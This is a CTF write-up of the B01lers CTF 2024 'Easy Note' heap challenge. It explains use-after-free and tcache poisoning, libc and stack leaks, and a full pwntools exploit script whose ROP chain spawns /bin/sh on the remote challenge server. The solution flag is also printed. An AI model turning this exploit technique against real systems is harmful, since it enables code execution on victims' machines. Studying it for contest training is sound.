---
title: Easy Note
date: 2024-04-15 03:00:00
description: From B01lers CTF 2024 - Pwn Challenges
tags: [pwn, heap]
categories: [CTF]
featured: true
---

## The Challenge

```
It's a note editor, what could possibly go wrong?

nc gold.b01le.rs 4001
```

The following files were given:
* chal
* Dockerfile
* flag.txt
* ld-2.27.so
* libc.so.6

In order to properly run the executable we must use the given libraries as `ldd` return the following:
```
$ ldd ./chal         
        linux-vdso.so.1 (0x00007ffec0f27000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f12c3c14000)
        /tmp/ld-2.27.so => /lib64/ld-linux-x86-64.so.2 (0x00007f12c3e14000)
```
The easiest way to cope with this is to patch the elf with the `patchelf` utility (remember to give executable permissions also to the other binaries):
```
patchelf ./chal --set-interpreter ./ld-2.27.so --replace-needed libc.so.6 ./libc.so.6 --output ./chalp
chmod +x ./ld-2.27.so
```

A first round of details and protections:
```
$ file ./chalp
./chalp: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.27.so, BuildID[sha1]=1671f51c231e09e7084decf9e3dbe368499206a7, for GNU/Linux 3.2.0, stripped
$ checksec ./chal                 
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
Actually we can see we have full protection on the binary.

Now a quick run of the challenge reveals its main purpose:
```
$ ./chalp   
-----Options---
-----Alloc-----
-----Free------
-----View------
-----Edit------
-----Exit------
-----Resize----
>
```
Being a note taking utility!

Let's open it in either IDA FREE or Ghidra.
We can immediately notice it's an HEAP based challenge as all the functions allocate, free and read memory from the heap.

There are many problems in these binary, let's take a closer look at some of them.
Here is the function that read the size for any operation that needs it:
```
__int64 sub_130A()
{
  __int64 v1[2]; // [rsp+0h] [rbp-10h] BYREF

  v1[1] = __readfsqword(0x28u);
  printf("size? ");
  __isoc99_scanf("%ld", v1);
  return v1[0];
}
```
As we can notice there are no bound on the number that we give as input: we can specify an arbitrary size to either allocate or write somewhere.
Here is the function to free an allocated note:
```
void free_opt()
{
  int index; // [rsp+Ch] [rbp-4h]

  index = get_index();
  if ( index != -1 )
    free((void *)qword_4040[index]);
}
```
This is very problematic for a couple of reasons: first it let us free whichever index we want, potentially also the same one multiple time, second it does not delete the content of whatever was into the allocated memory (which in conjunction with the next two functions allows us to view and edit heap chunks even after they're freed).
The view function let us read memory at any index we want so it has not been reported for brevity.
The edit function instead is actually interesting:
```
__int64 edit_opt()
{
  __int64 result; // rax
  int v1; // [rsp+8h] [rbp-8h]
  int size; // [rsp+Ch] [rbp-4h]

  result = get_index();
  v1 = result;
  if ( (_DWORD)result != -1 )
  {
    size = get_size();
    return read(0, (void *)qword_4040[v1], size);
  }
  return result;
}
```
It let us write an unbounded amount of data to whichever address is actually stored at the given index.
If we can trick the program to store the address we want under a certain index we basically achieve arbitrary writes.

## Solve

### Tcache

In order to make allocation and deallocation faster, a caching layer has been implemented into the ptmalloc (which is the standard allocator function in libc).
The first of these solution is the *Tcache*: a single-linked list of up to 7 chuncks that have been freed.
Normally a chunk should look like this:
```
+---------------------------------------+
| Size of previous chunk (if allocated) |
+---------------------------------------+
| Size of chunk in bytes                |
+---------------------------------------+
| User data...                          |
|                                       |
+---------------------------------------+
```
When they're freed the first part of what used to be memory data gets occupied by the pointers necessary to keep the list of the various caches:
```
+---------------------------------------+
| Size of previous chunk (if allocated) |
+---------------------------------------+
| Size of chunk in bytes                |
+---------------------------------------+
| Pointer to the next chunk in Tcache   |
+---------------------------------------+
| Unused space...                       |
+---------------------------------------+
```
The caching mechanism work such that when a new `malloc` is requested, if the chunks in the *Tcache* can satisfy the amount of memory required they're given back to the user.

A vulnerability resides in the fact that the user can access, or *use*, the chunk after it has been *freed*: Use After Free (UAF).
This will be used in a couple of way to exploit the binary.

### Libc Base Address

As the binary has all countermeasure in place we need to resort to a return to libc type of exploit.
But these require us to leak the libc base address in order to compute the address from the offsets.

The *Tcache* list we mentioned before is actually bounded to hold up to 7 chunks, whatever gets freed after that will be sorted in other locations according to its size and carachteristics.
If it doesn-t fit in the *Tcache* it may actually go in some of the following:
* fast bins
* unsorted bins
* others

Fast bins are special containers that hold unlimited single-linked lists of chunks of dimensions up to `0x80` bytes.
They're actually divided according to the size they hold: same sized chunks will go into the same fast bin.

Unsorted bins would instead store a double-linked list of chucnks of arbitrary size and they're relevant to us as the first chunk gets written inside it the address of the `main_arena` which is at a fixed offset in libc.
This can be easily exploited bu us as we can read the content of a chunk even after having freed it but we need to be sure that when the `free` function gets called it moves the chunk inside the unsorted bins.
To achieve this:
```python
# We allocate a bunch of chuncks that are larger than the max size of fast bins
for i in range(10):
    alloc(i, 0x90)
# We free 7 of them to fill the Tcache
for i in range(7):
    free(i)
# When we free another one it will go into the unsorted bins
free(8)
```
Using the attached gdb debugger we can inspect the bins and examine the content of the chunks:
```
# show all the bins and freed chunks
(gdb) heap bins
# under unsorted bin a chunk will appear, let's examine the memory at that address
(gdb) x/2gx <unsorted chunk>
# displayed hex values will be the address of the main arena, let's compute the offset from libc
# show where libc is currently loaded
(gdb) vmmap
# take the section of libc that's red (i.e. marked as executable)
(gdb) p <addr inside unsorted chunk> - <libc base>
```

```python
# Here is the computed offset
offset = 0x3afca0
# Which we can subtract from the value we read to compute libc base address at runtime
libc_base = view(8) - offset
print(f"Leaked libc base address: {hex(libc_base)}")
# And set into pwntools for later use
libc.address = libc_base
```

### Malloc Hook (Failed Attempt)

After leaking libc base a common solution is to overwite the content of the `__malloc_hook` variable in libc (which is at a fixed offset) with a custom function, usually a one gadget that spawns a shell.
These hooks, we also have free, realloc and more, gets called right after or before the associated function call.

Before showing the exploit let's explore how to achieve arbitrary write by manipulating the chunks.
Say we have 2 chunks in the *Tcache*, the layout should be something like this:
```
+--------------------------------+
| TCache Head somewhere in memory|
+--------------------------------+
  |
  |   +-----------------+ Chunk 1
  --> | PrevSize | Size |
      +-----------------+      +-----------------+ Chunk 2
      | Next Pointer --------> | PrevSize | Size |
      +-----------------+      +-----------------+
                               | Next Pointer --------> ...
                               +-----------------+
```
However, even if they've been freed, we can still access and control their content via the edit function.
We could for overwrite the content of Chunk 1 with an arbitrary address, thus corrupting the list.
```
+--------------------------------+
| TCache Head somewhere in memory|
+--------------------------------+
  |
  |   +-----------------+ Chunk 1
  --> | PrevSize | Size |
      +-----------------+
      | 0xdeadbeef --------> ?
      +-----------------+
```
When we call `malloc` the following time what happens is that the first chunk of the list gets returned to the user, and now the head of *Tcache* points at the address that was written within it:
```
+--------------------------------+
| TCache Head somewhere in memory|
+--------------------------------+
  |
  |
  --> 0xdeadbeef
```
Now the next `malloc` call returns exactly the address that we inserted before, thus proving us the ability to write our content exactly at that address.

Back to the original plan, we need to find the address of the malloc hook:
```python
malloc_hook = libc.symbols["__malloc_hook"]
print(f"Malloc hook address {hex(malloc_hook)}")
```
After setting `libc.address` is as easy as this.

Now we need to overwrite the value at that address with a pointer to a suitable function.
To achieve this a very nice tool is `one_gadget` that scans libc to find a one gadget ropchain that spawn the shell, among the returned gadget we need to use the one we can satisfy the requirement.
```
$ one_gadget libc.so.6
0x41602 execve("/bin/sh", rsp+0x2f, environ)
constraints:
  address rsp+0x40 is writable
  rax == NULL || {rax, "-c", r12, NULL} is a valid argv

0x41656 execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv

0xdeec2 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```

Now we need to break at the moment before calling the one gadget and see which of the 3 gadget we can apply.
We'll do this by writing a fake address that will cause segmentation fault when execution will be redirected to it:
```python
edit(6, 0x8, p64(malloc_hook))
alloc(0,0x90)
alloc(1,0x90)
edit(1, 0x8, b'B'*8)
```
gdb should complain about jumping at a BBBBBBBB address.
The problem is.. that none of the requirements can be met in such situation!
An attempt was also made with other hooks but none of them managed to solve the required constraints.

### The Stack Way

Out of ideas the only remaining option would be to try to build a succesful ropchain on the stack that could solve the constrians before calling the one gadget.

This would however require to first leak a stack address.
Luckily there is an `environ` variable in libc that points to the environment array on the stack.
We can examine its value in gdb using and view its address to compute its offset within libc
```
(gdb) p environ
(gdb) p &environ
(gdb) p <environ addr> - <libc base>
```

This allow us to find a refrence point within the stack which should be quite stable as the environment array gets build early in the program stack:
```python
# Environment offset found with the technique said before
environ_offset = 0x3b2098
environ_addr = libc.address + environ_offset

# Usual operations to perform an arbitrary read (just call view instead of edit)
edit(6, 0x8, p64(environ_addr))
alloc(0,0x90)
alloc(1,0x90)
stack_addr = view(1)
print(f'Stack address is: {hex(stack_addr)}')
```

Our first idea was to compute the offset from that array to the stack base, that would have allowed us to compute the offset of the main function or similar, and overwrite their return address with our ropchain.
Unfortunately after many tries we realized that it wasn't stable enough, even after building a nop slep to ease the exploit.
Luckily we realized that we didn't have to find the real stack base: is was enough to check if the ret of a known function was at a fixed offset from our referene point, the environ array.
Indeed it was, taking the edit function that we were targeting we noticed a fixed delta od `0x120` from it.

This led to the following exploit:
```python
# Fill the Tcache just to be sure
for i in range(7):
    alloc(i, 0x60) # different tcache for clarity
for i in range(7):
    free(i)

# Load the ret address of the edit function into the next pointer
edit(6,0x8,p64(stack_addr - 0x120))
alloc(0,0x60)
alloc(1,0x60)

# Now we write a bunch of BBBBBB just to trigger the segfault and check the exploit.
edit(1,0x8, b'B'*8)
```

Now that we can reliably hit the ret address it's time to build the rop chain.
After testing a combination of a gadget to clear rax and the one gadgets discovered before we decided to build the ropchain completely from scratch using ROPGadget:
```
ROPGadget --binary ./libc.so.6 --ropchain
```

This returned python code to build it but we needed to sum the libc base address:
```python
from struct import pack

# Padding goes here
p = b''

p += pack('<Q', libc.address + 0x0000000000001b96) # pop rdx ; ret
# [...]
p += pack('<Q', libc.address + 0x00000000000013bc) # syscall
# Repeat the instructions above but replace the last instruction with this one
edit(1,0xf00, p)

con.interactive()
```

And you get a shell:
```
ls
cat flag.txt
```

At last we got the flag: `bctf{j33z_1_d1dn7_kn0w_h34p_1z_s0_easy}`.

## Script

{% highlight python linenos %}
#!/usr/bin/env python3

from pwn import *

binary = './chalp'
context.log_level= 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.binary = binary

host_and_port = "gold.b01le.rs:4001"
host = host_and_port[:host_and_port.find(':')]
port = int(host_and_port[host_and_port.find(':')+1:])

# con = process(binary)
elf = ELF(binary)
libc = ELF('libc.so.6')
# gdb.attach(con,gdbscript='continue')
con = remote(host, port)

# ---------------------------------------
# Utility Functions
# ---------------------------------------

def alloc(id, size):
    con.sendlineafter(b'Resize----',b'1')
    con.sendlineafter(b"Where?", str(id))
    con.sendlineafter(b"size?", str(size))

def free(id):
    con.sendlineafter(b'Resize----', b'2')
    con.sendlineafter(b'Where?', str(id))

def view(id):
    con.sendlineafter(b'Resize----', b'3')
    con.sendlineafter(b'Where? ', str(id))
    return u64(con.recvline()[:-1].ljust(8, b'\0'))


def edit(id, size, content):
    con.sendlineafter(b'Resize----',b'4')
    con.sendlineafter(b"Where?", str(id))
    con.sendlineafter(b"size?", str(size))
    con.sendline(content)

def resize(id,size):
    con.sendlineafter(b'Resize----',b'6')
    con.sendlineafter(b"Where?", str(id))
    con.sendlineafter(b"size?", str(size))

# ---------------------------------------
# Libc Leak
# ---------------------------------------

for i in range(10):
    alloc(i, 0x90)
for i in range(7):
    free(i)

free(8)

offset = 0x3afca0
libc_base = view(8) - offset
print(f"Leaked libc base address: {hex(libc_base)}")
libc.address = libc_base

# ---------------------------------------
# Stack Leak
# ---------------------------------------

environ_offset = 0x3b2098

environ_addr = libc.address + environ_offset
edit(6, 0x8, p64(environ_addr))
alloc(0,0x90)
alloc(1,0x90)
stack_addr = view(1)
print(f'Stack address is: {hex(stack_addr)}')

# ---------------------------------------
# Ropchain onto the Stack
# ---------------------------------------

for i in range(7):
    alloc(i, 0x60) # different tcache for clarity
for i in range(7):
    free(i)
edit(6,0x8,p64(stack_addr - 0x120))
alloc(0,0x60)
alloc(1,0x60)

from struct import pack

# Padding goes here
p = b''

p += pack('<Q', libc.address + 0x0000000000001b96) # pop rdx ; ret
p += pack('<Q', libc.address + 0x00000000003af1a0) # @ .data
p += pack('<Q', libc.address + 0x0000000000037a58) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', libc.address + 0x000000000002db3c) # mov qword ptr [rdx], rax ; ret
p += pack('<Q', libc.address + 0x0000000000001b96) # pop rdx ; ret
p += pack('<Q', libc.address + 0x00000000003af1a8) # @ .data + 8
p += pack('<Q', libc.address + 0x0000000000094115) # xor rax, rax ; ret
p += pack('<Q', libc.address + 0x000000000002db3c) # mov qword ptr [rdx], rax ; ret
p += pack('<Q', libc.address + 0x000000000002154d) # pop rdi ; ret
p += pack('<Q', libc.address + 0x00000000003af1a0) # @ .data
p += pack('<Q', libc.address + 0x000000000002145c) # pop rsi ; ret
p += pack('<Q', libc.address + 0x00000000003af1a8) # @ .data + 8
p += pack('<Q', libc.address + 0x0000000000001b96) # pop rdx ; ret
p += pack('<Q', libc.address + 0x00000000003af1a8) # @ .data + 8
p += pack('<Q', libc.address + 0x0000000000094115) # xor rax, rax ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000af990) # add rax, 1 ; ret
p += pack('<Q', libc.address + 0x00000000000013bc) # syscall
edit(1,0xf00, p)

con.interactive()
{% endhighlight %}
